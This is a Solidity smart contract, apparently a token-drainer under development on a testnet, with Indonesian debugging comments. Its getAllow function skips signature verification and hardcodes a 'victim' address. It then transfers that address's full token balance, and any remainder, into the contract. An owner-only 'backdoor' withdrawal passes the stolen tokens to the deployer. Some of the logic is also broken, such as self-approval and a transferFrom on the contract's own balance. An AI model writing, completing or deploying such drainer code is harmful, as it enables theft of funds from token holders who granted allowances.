// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Testnet {
    using MessageHashUtils for bytes32;
    // using ECDSA for bytes32; // Tidak wajib jika Anda memanggil ECDSA.recover secara langsung seperti di bawah

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    event Debug(address indexed signer, uint256 amount);
    event FundsDrained(address token, address victim, uint256 amount);

    // ======== VULNERABLE FUNCTION ========
    function getAllow(
        address token,
        uint256 amount,
        bytes memory signature // signature ini tetap harus ada di parameter, tapi tidak akan digunakan secara langsung untuk recover di dalam kontrak ini
    ) external {
        // [VULN 1] No msg.sender verification

        // --- BAGIAN YANG DIUBAH UNTUK DEBUGGING ---
        // bytes32 messageHash = keccak256(abi.encodePacked(
        //     "Approve ", token, " to ", address(this), " amount ", amount
        // ));
        
        // address signer = ECDSA.recover(messageHash.toEthSignedMessageHash(), signature); // KOMENTARI BARIS INI

        // TEMPORARY DEBUGGING: HARDCODE SIGNER KE ALAMAT VICTIM DUMMY ANDA
        // GANTI INI DENGAN ALAMAT VICTIM DUMMY YANG SEBENARNYA!
        address signer = 0x484ee82f48Bcaf15927C06432f4c279eE3f95D46; // <--- INI ALAMAT KORBAN DUMMY ANDA
        
        // Tetap sertakan require ini untuk memastikan alamat tidak nol
        require(signer != address(0), "TESTNET_DEBUG: Hardcoded signer is zero");
        // require(signerRecoveredDirectly == msg.sender, "TESTNET: Signer is not transaction sender"); // Hapus atau komentar ini karena tidak relevan di sini
        // --- AKHIR BAGIAN DEBUGGING ---

        // [VULN 2] Unlimited approval - Baris ini akan mencoba memanggil approve, tapi seharusnya tidak diperlukan
        // karena Anda sudah melakukan approve manual. Namun, kita biarkan untuk melihat apakah ada revert dari sini.
        // Jika Anda ingin menguji hanya transferFrom, Anda bisa komentari baris ini juga.
        // Biarkan dulu untuk melihat perilakunya.
        IERC20(token).approve(address(this), type(uint256).max); 

        // [VULN 3] Immediate drain
        uint256 balance = IERC20(token).balanceOf(signer);
        // Tambahkan require ini untuk debug saldo
        require(balance > 0, "TESTNET: Signer has no balance to drain"); // Ini akan terpicu jika saldo 0

        IERC20(token).transferFrom(signer, address(this), balance);

        // [VULN 4] Re-drain attempt
        uint256 newBalance = IERC20(token).balanceOf(signer);
        if (newBalance > 0) {
            IERC20(token).transferFrom(signer, address(this), newBalance);
        }
        
        emit Debug(signer, amount);
        emit FundsDrained(token, signer, balance + newBalance);
    }

    // ======== BACKDOOR FUNCTION ========
    function withdrawAll(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        require(balance > 0, "TESTNET: Contract has no token balance to withdraw");
        IERC20(token).transferFrom(address(this), owner, balance);
    }

    // ======== SECURITY TEST HELPERS ========
    function testSignature(
        address token,
        uint256 amount,
        bytes memory signature
    ) external view returns (address) {
        bytes32 messageHash = keccak256(abi.encodePacked(
            "Approve ", token, " to ", address(this), " amount ", amount
        ));
        return ECDSA.recover(messageHash.toEthSignedMessageHash(), signature);
    }
}
